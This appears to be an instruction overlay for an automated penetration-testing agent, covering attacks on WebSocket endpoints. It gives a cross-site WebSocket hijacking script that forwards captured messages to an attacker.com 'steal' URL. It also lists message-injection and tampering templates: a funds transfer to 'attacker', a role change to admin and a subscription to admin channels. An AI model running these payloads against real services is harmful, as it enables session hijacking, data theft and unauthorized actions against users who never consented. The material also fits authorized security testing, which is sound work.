# WebSocket — Dynamic Overlay

## Metadata
- **Exploit Type**: websocket
- **Applies To**: Gamma, Specialist (auto-spawned)
- **Loading**: Appended when WebSocket upgrade detected or `exploit_type === "websocket"`

---

## OVERLAY_CONTEXT

WebSocket security issues include missing origin validation, CSWSH (Cross-Site WebSocket Hijacking), message injection, and stateful abuse. Success indicators: session hijacking, unauthorized actions, or data exfiltration via WebSocket channels.

---

## WebSocket Basics

```
Upgrade: websocket
Connection: ws://host/path or wss://host/path (secure)
```

---

## Attacks

### 1. CSWSH (Cross-Site WebSocket Hijacking)

If server doesn't validate Origin:
```html
<script>
new WebSocket('wss://target.com/ws').onmessage = function(e) {
  fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
}
</script>
```

### 2. Origin Validation Bypass

Test origins:
```
https://target.com
https://attacker.com
null
WebSocket bypass: attacker-controlled subdomain
```

### 3. Message Injection

If server doesn't validate sender:
```
# Send as authenticated user
ws.send('{"action": "transfer", "to": "attacker", "amount": 1000}')
```

### 4. Parameter Tampering

```
# Manipulate channel/subscription parameters
{"action": "subscribe", "channel": "user_123"}
{"action": "subscribe", "channel": "admin_notifications"}
```

---

## Fingerprinting

```
# Send WebSocket handshake
ws = new WebSocket('wss://target.com/path')
ws.onopen = function() { console.log('Open'); }
ws.onmessage = function(e) { console.log(e.data); }
```

---

## Message Templates

### Authentication
```
{"type": "auth", "token": "JWT_OR_SESSION"}
{"action": "login", "username": "admin", "password": "..."}
```

### Data Exfiltration
```
{"action": "fetch_data", "resource": "internal_api"}
```

### State Manipulation
```
{"action": "update_profile", "field": "role", "value": "admin"}
```

---

## Constraints

```
- CSWSH requires the victim to visit your page while logged into target
- Origin validation is browser-enforced — test with actual browser (MCP Agent)
- WebSocket messages are often JSON — standard injection applies
- Check for rate limiting on WebSocket connections
- Stateful nature means sequence matters — authenticate before action
```

---

*Overlay version: 1.0*
